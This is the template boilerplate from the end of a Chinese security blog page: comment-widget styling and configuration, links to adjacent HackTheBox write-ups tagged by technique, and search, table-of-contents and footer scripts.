    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="https://unpkg.com/valine/dist/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: 'BwVA2Xrm8Nb2jkt7vzHraj5v-gzGzoHsz',
        appKey: 'fU1ygroQcwd8phJAJRiJx0lL',
        notify: 'false' === 'true',
        verify: 'true' === 'true',
        visitor: 'true' === 'true',
        avatar: 'retro',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: '昵称、邮箱、网址非必填项，可直接匿名评论。',
        enableQQ: false, //昵称输入qq号自动识别
        emojiCDN: '//i0.hdslb.com/bfs/emote/', 
        // 表情title和图片映射
        emojiMaps: {
        "tv_doge": "6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png",
        "tv_亲亲": "a8111ad55953ef5e3be3327ef94eb4a39d535d06.png",
        "tv_偷笑": "bb690d4107620f1c15cff29509db529a73aee261.png",
        "tv_再见": "180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png",
        "tv_冷漠": "b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png",
        "tv_发怒": "34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png",
        "tv_发财": "34db290afd2963723c6eb3c4560667db7253a21a.png",
        "tv_可爱": "9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png",
        "tv_吐血": "09dd16a7aa59b77baa1155d47484409624470c77.png",
        "tv_呆": "fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png",
        "tv_呕吐": "9f996894a39e282ccf5e66856af49483f81870f3.png",
        "tv_困": "241ee304e44c0af029adceb294399391e4737ef2.png",
        "tv_坏笑": "1f0b87f731a671079842116e0991c91c2c88645a.png",
        "tv_大佬": "093c1e2c490161aca397afc45573c877cdead616.png",
        "tv_大哭": "23269aeb35f99daee28dda129676f6e9ea87934f.png",
        "tv_委屈": "d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png",
        "tv_害羞": "a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png",
        "tv_尴尬": "7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png",
        "tv_微笑": "70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png",
        "tv_思考": "90cf159733e558137ed20aa04d09964436f618a1.png",
        "tv_惊吓": "0d15c7e2ee58e935adc6a7193ee042388adc22af.png",
        "tv_打脸": "56ab10b624063e966bfcb76ea5dc4794d87dfd47.png",
        "tv_抓狂": "fe31c08edad661d63762b04e17b8d5ae3c71a757.png",
        "tv_抠鼻": "c666f55e88d471e51bbd9fab9bb308110824a6eb.png",
        "tv_斜眼笑": "911f987aa8bc1bee12d52aafe62bc41ef4474e6c.png",
        "tv_无奈": "ea8ed89ee9878f2fece2dda0ea8a5dbfe21b5751.png",
        "tv_晕": "5443c22b4d07fb1907ccc610c8e6db254f2461b7.png",
        "tv_流汗": "cead1c351ab8d79e9f369605beb90148db0fbed3.png",
        "tv_流泪": "7e71cde7858f0cd50d74b0264aa26db612a8a167.png",
        "tv_流鼻血": "c32d39db2737f89b904ca32700d140a9241b0767.png",
        "tv_点赞": "f85c354995bd99e28fc76c869bfe42ba6438eff4.png",
        "tv_生气": "26702dcafdab5e8225b43ffd23c94ac1ff932654.png",
        "tv_生病": "8b0ec90e6b86771092a498c54f09fc94621c1900.png",
        "tv_疑问": "0793d949b18d7be716078349c202c15ff166f314.png",
        "tv_白眼": "c1d59f439e379ee50eef488bcb5e5378e5044ea4.png",
        "tv_皱眉": "72ccad6679fea0d14cce648b4d818e09b8ffea2d.png",
        "tv_目瞪口呆": "0b8cb81a68de5d5365212c99375e7ace3e7891b7.png",
        "tv_睡着": "8b196675b53af58264f383c50ad0945048290b33.png",
        "tv_笑哭": "1abc628f6d4f4caf9d0e7800878f4697abbc8273.png",
        "tv_腼腆": "89712c0d4af73e67f89e35cbc518420380a7f6f4.png",
        "tv_色": "61822c7e9aae5da76475e7892534545336b23a6f.png",
        "tv_调侃": "4bc022533ef31544ca0d72c12c808cf4a1cce3e3.png",
        "tv_调皮": "b9c41de8e82dd7a8515ae5e3cb63e898bf245186.png",
        "tv_鄙视": "6e72339f346a692a495b123174b49e4e8e781303.png",
        "tv_闭嘴": "c9e990da7f6e93975e25fd8b70e2e290aa4086ef.png",
        "tv_难过": "87f46748d3f142ebc6586ff58860d0e2fc8263ba.png",
        "tv_馋": "fc7e829b845c43c623c8b490ee3602b7f0e76a31.png",
        "tv_鬼脸": "0ffbbddf8a94d124ca2f54b360bbc04feb6bbfea.png",
        "tv_黑人问号": "45821a01f51bc867da9edbaa2e070410819a95b2.png",
        "tv_鼓掌": "1d21793f96ef4e6f48b23e53e3b9e42da833a0f6.png"
            // ... 更多表情
        }
    });
</script>

<!--酷Q推送-->


<!-- 直达评论 -->
<div id="to_comment" class="comment-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#vcomments" title="直达评论">
        <i class="fas fa-comments"></i>
    </a>
</div>


    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/posts/7f4bdc86.html">
                    <div class="card-image">
                        
                        <img src="/medias/article_cover/Forgot.png" class="responsive-img" alt="HTB-Forgot">
                        
                        <span class="card-title">HTB-Forgot</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            HackTheBox-Forgot
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-03-15
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="post-category">
                                    靶机
                                </a>
                            
                            <a href="/categories/%E9%9D%B6%E6%9C%BA/HackTheBox/" class="post-category">
                                    HackTheBox
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/varnish%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%BC%93%E5%AD%98/">
                        <span class="chip bg-color">varnish反向代理缓存</span>
                    </a>
                    
                    <a href="/tags/%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81%E5%8A%9F%E8%83%BD%E6%8A%95%E6%AF%92/">
                        <span class="chip bg-color">重置密码功能投毒</span>
                    </a>
                    
                    <a href="/tags/CVE-2022-29216%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89/">
                        <span class="chip bg-color">CVE-2022-29216（命令执行）</span>
                    </a>
                    
                    <a href="/tags/python%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
                        <span class="chip bg-color">python代码审计</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/posts/d0709a37.html">
                    <div class="card-image">
                        
                        <img src="/medias/article_cover/Soccer.png" class="responsive-img" alt="HTB-Soccer">
                        
                        <span class="card-title">HTB-Soccer</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            HackTheBox-Soccer
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-08
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="post-category">
                                    靶机
                                </a>
                            
                            <a href="/categories/%E9%9D%B6%E6%9C%BA/HackTheBox/" class="post-category">
                                    HackTheBox
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Tiny-File-Manager%E5%BC%B1%E5%8F%A3%E4%BB%A4/">
                        <span class="chip bg-color">Tiny File Manager弱口令</span>
                    </a>
                    
                    <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
                        <span class="chip bg-color">文件上传</span>
                    </a>
                    
                    <a href="/tags/ngnix/">
                        <span class="chip bg-color">ngnix</span>
                    </a>
                    
                    <a href="/tags/WebSocket%E5%AE%9E%E7%8E%B0SQL%E6%B3%A8%E5%85%A5/">
                        <span class="chip bg-color">WebSocket实现SQL注入</span>
                    </a>
                    
                    <a href="/tags/doas%E5%92%8Cdstat%E8%81%94%E5%8A%A8%E6%8F%90%E6%9D%83/">
                        <span class="chip bg-color">doas和dstat联动提权</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('1')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: wa0er<br />'
            + '文章作者: wa0er<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '引用或转载文章内容时，注明源文章链接就好，谢谢您。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('3'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2022-2023</span>
            
            <a href="/about" target="_blank">wa0er</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>

            <br>
            
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点文章总字数:&nbsp;<span
                        class="white-color">68.8k&nbsp;字</span>
            
            

            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link ">
    <a href="https://github.com/wa0er" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:heyzky@foxmail.com" class="tooltipped" target="_blank" data-tooltip="我的邮箱" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>













    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
